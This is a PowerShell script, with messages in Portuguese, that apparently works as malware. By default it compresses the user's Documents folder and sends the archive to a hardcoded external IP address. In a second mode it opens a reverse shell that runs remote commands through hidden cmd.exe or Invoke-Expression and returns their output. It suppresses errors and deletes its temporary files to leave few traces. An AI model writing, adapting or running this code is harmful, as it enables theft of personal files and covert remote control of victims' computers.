param (
    [string]$TargetIP = "45.5.248.47",
    [int]$TargetPort = 8006,
    [string]$SourceDirectory = (Join-Path ([Environment]::GetFolderPath('MyDocuments')) ""),
    [switch]$BecomeCommandExecutor
)

$client = $null
$stream = $null
$zipFilePath = $null

try {
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect(${TargetIP}, $TargetPort)

    $stream = $client.GetStream()

    if ($BecomeCommandExecutor) {
        $stream.WriteByte(0x02)
        
        while ($client.Connected) {
            $commandLengthBytes = New-Object byte[] 4
            $readBytes = $stream.Read($commandLengthBytes, 0, $commandLengthBytes.Length)
            if ($readBytes -ne $commandLengthBytes.Length) { break }
            $commandLength = [System.BitConverter]::ToInt32($commandLengthBytes, 0)
            if ($commandLength -eq 0) { break }

            $commandBytes = New-Object byte[] $commandLength
            $readBytes = $stream.Read($commandBytes, 0, $commandLength)
            if ($readBytes -ne $commandLength) { break }
            $command = [System.Text.Encoding]::UTF8.GetString($commandBytes)

            $output = ""
            try {
                if ($command.StartsWith("cmd:", [System.StringComparison]::OrdinalIgnoreCase)) {
                    $cmdToExecute = $command.Substring(4)
                    $tempOutputFile = Join-Path ([System.IO.Path]::GetTempPath()) ([System.Guid]::NewGuid().ToString() + ".tmp")

                    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
                    $processInfo.FileName = "cmd.exe"
                    $processInfo.Arguments = "/c `"$cmdToExecute`" > `"$tempOutputFile`" 2>&1"
                    $processInfo.UseShellExecute = $false
                    $processInfo.CreateNoWindow = $true
                    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

                    $process = [System.Diagnostics.Process]::Start($processInfo)
                    $process.WaitForExit()

                    if (Test-Path $tempOutputFile) {
                        $output = [System.IO.File]::ReadAllText($tempOutputFile, [System.Text.Encoding]::UTF8).Trim()
                        Remove-Item $tempOutputFile -Force -ErrorAction SilentlyContinue
                    } else {
                        $output = "Comando CMD executado sem saída visível ou arquivo temporário não encontrado."
                    }
                } else {
                    $output = (Invoke-Expression $command 2>&1 | Out-String).Trim()
                }
                if ([string]::IsNullOrWhiteSpace($output)) { $output = "Comando executado sem saída visível." }
            } catch {
                $output = "ERRO ao executar comando: $($_.Exception.Message)"
            }
            
            $outputBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
            $outputLengthBytes = [System.BitConverter]::GetBytes($outputBytes.Length)
            $stream.Write($outputLengthBytes, 0, $outputLengthBytes.Length)
            $stream.Write($outputBytes, 0, $outputBytes.Length)
            $stream.Flush()
        }
    }
    else {
        $stream.WriteByte(0x01)

        if (-not (Test-Path $SourceDirectory -PathType Container)) {
            throw "ERRO: O diretório de origem '$SourceDirectory' não existe."
        }

        $zipFileName = "$(Split-Path $SourceDirectory -Leaf)_$((Get-Date).ToString('yyyyMMddHHmmss')).zip"
        $zipFilePath = Join-Path ([System.IO.Path]::GetTempPath()) $zipFileName

        try {
            Compress-Archive -Path "$SourceDirectory\*" -DestinationPath $zipFilePath -Force -ErrorAction Stop
        } catch {
            throw "ERRO ao compactar o diretório: $($_.Exception.Message)"
        }

        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
        $fileNameBytes = [System.Text.Encoding]::UTF8.GetBytes($zipFileName)
        
        $fileNameLengthBytes = [System.BitConverter]::GetBytes($fileNameBytes.Length)
        $fileSizeBytes = [System.BitConverter]::GetBytes([long]$fileBytes.Length)

        $stream.Write($fileNameLengthBytes, 0, $fileNameLengthBytes.Length)
        $stream.Write($fileNameBytes, 0, $fileNameBytes.Length)
        $stream.Write($fileSizeBytes, 0, $fileSizeBytes.Length)

        $stream.Write($fileBytes, 0, $fileBytes.Length)
        $stream.Flush()
    }

}
catch [System.Net.Sockets.SocketException] {
    # No logs for client
}
catch {
    # No logs for client
}
finally {
    if ($stream -ne $null) { try { $stream.Close() } catch {} }
    if ($client -ne $null -and $client.Connected) { try { $client.Close() } catch {} }
    
    if (-not $BecomeCommandExecutor -and $zipFilePath -ne $null -and (Test-Path $zipFilePath)) {
        try { Remove-Item $zipFilePath -Force -ErrorAction SilentlyContinue } catch {}
    }
}
